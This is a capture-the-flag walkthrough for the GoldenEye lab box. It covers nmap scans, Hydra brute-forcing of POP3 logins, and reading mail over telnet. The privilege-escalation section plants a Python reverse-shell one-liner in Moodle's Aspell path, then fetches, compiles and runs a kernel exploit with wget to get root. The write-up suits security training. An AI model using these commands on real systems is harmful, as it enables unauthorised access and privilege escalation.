# Intro & Enumeration
## This room will be a guided challenge to hack the James Bond styled box and get root.
### Use nmap to scan the network for all ports. How many ports are open?
```bash
nmap -p- -Pn <IP>
```
- `-p-`: Allow us to scan all 65535 TCP ports
- `-Pn`: Skips the host discovery process (ping scan)

[SCREEN01]

### Who needs to make sure they update their default password?

1. Go to the <IP>:80 site
2. Right click -> 'View Page Source'
3. In `view-source:http://<IP>/` go to `terminal.js`
[SCREEN02]
4. In `view-source:http://<IP>/terminal.js` we can see some interesting comments
[SCREEN03]

### Whats their password?
We can decode encoded password using [CyberChief](https://gchq.github.io/CyberChef/), and selecting '**From HTML Entity**'

# Its mail time...
## Onto the next steps
### If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra? Whats their new password?
Hint: pop3
1. Let's check the previously unknown ports for more information. We can see that port 55007 is for pop3
```bash
nmap -p 55006,55007 -sV <IP>
```
- `-p `: Allow us to scan selected ports
- `-sV`: Probes ports to determine service/version info

[SCREEN04]

2. Unfortunately previous credentials do not work
```bash
telnet <IP> 55007
USER boris
PASS I**r
``` 
[SCREEN05]

3. So we go with the hydra:
```bash
hydra -l boris -P /root/Tools/wordlists/fasttrack.txt <IP> pop3 -s 55007
```
- `-l`: Single username specification
- `-P`: Password list file path
- `-s`: Port specification

[SCREEN06]

### What can you find on this service?

The answer is: `emails`

1. We can login with newly acquired password, and look through the messages
```bash
telnet <IP> 55007
USER boris
PASS s**!
LIST
RETR 1
RETR 2
RETR 3
QUIT
```
2. From message number 2 we can see that Boris was messaging with Natalya - so this will be our next target
```bash
hydra -l natalya -P /root/Tools/wordlists/fasttrack.txt <IP> pop3 -s 55007
```
[SCREEN07]

3. Let's login to Natalya account. In second email we can find credentials for new student - xenia
```bash
telnet <IP> 55007
USER natalya
PASS b**d
LIST
RETR 1
RETR 2
```

[SCREEN08]

### What user can break Boris codes?
We can find answer in second message for Boris and first for Natalya
[SCREEN09]
[SCREEN10]

# GoldenEye Operators Training
## Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.

### Try using credentials you found earlier. Which user can you login as?
It's the last one we have found `xenia:R**!`

### Have a poke around this site. What other users can you find?
We can find [message](http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5) from Dr. Doak

[SCREEN11]

### What was this user password?
We go back to hydra:
```bash
hydra -l doak -P /root/Tools/wordlists/fasttrack.txt <IP> pop3 -s 55007
```
[SCREEN12]

### What is the next user you can find from doak?
### What is the users password?
After login to pop3 in first email has them in plaintext:
```bash
telnet <IP> 55007
USER doak
PASS g**t
LIST
RETR 1
```
user and password `dr_doak:4**!`

[SCREEN13]

# Privilege Escalation
##  Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

### Whats the kernel version?
Hint: Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and 'spell check it'.

1. Set listener with netcat:
```bash
nc -lvnp 1234
```
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: Skip DNS lookup
- `-p`: Specify the port number to listen on

2. Login to moodle with admin credentials `admin:x**!` from image, and search for '[spell](http://severnaya-station.com/gnocertdir/admin/search.php?query=spell)'. Change 'Spell engine' to 'PSpellShell' and put the below script into 'path to aspell':
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
[SCREEN17]

3. Now when activate spellcheck on [some text](http://severnaya-station.com/gnocertdir/mod/forum/post.php?forum=1) to get reverse shell

Once we are in:
```bash
uname -a
```
- `-a`: Displays all system information that `uname` can provide

[SCREEN14]

### What is the root flag?
1. Run to enable sending files:
```bash
python -m SimpleHTTPServer 1337
```

2. We need to modify 143 line of the [37292](https://www.exploit-db.com/exploits/37292) to look like this

[SCREEN15]

```bash
wget <IP>:<PORT>/37292.c
```
```bash
cc 37292.c -o exploit
```
```bash
./exploit
```
```bash
cat /root/.flag.txt
```
[SCREEN16]